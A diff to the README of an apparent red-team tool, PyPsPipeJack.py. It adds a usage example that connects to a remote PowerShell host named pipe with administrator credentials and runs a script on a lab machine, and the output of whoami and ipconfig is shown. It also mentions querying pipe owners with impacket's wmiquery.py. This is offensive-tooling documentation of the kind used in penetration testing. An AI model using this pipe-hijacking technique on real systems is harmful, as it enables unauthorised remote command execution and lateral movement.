@@ -96,7 +96,34 @@ hello
 PS> 
 ```
 
+### Connect to Remote PSHost Pipe and Run PS1 Script
+```
+$ cat test.ps1                                
+echo hello
+echo hello2
+whoami
+ipconfig
 
+$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --script test.ps1
+
+hello
+hello2
+lab\administrator
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : lab.local
+   Link-local IPv6 Address . . . . . : fe80::f0d3:c6c2:48ad:94f5%13
+   IPv4 Address. . . . . . . . . . . : 192.168.1.101
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::20c:29ff:fe9d:a180%13
+                                       192.168.1.1
+
+
+```
 ### Find Which User Owns the PowerShell Pipe Without Command Execution (WMIQUERY)
 
 No need to run whoami, or whatever PowerShell command to see who the PowerShell pipe belongs to. We can check with wmiquery.py form impacket. Wmi Query Language is massivly unerappreciated.
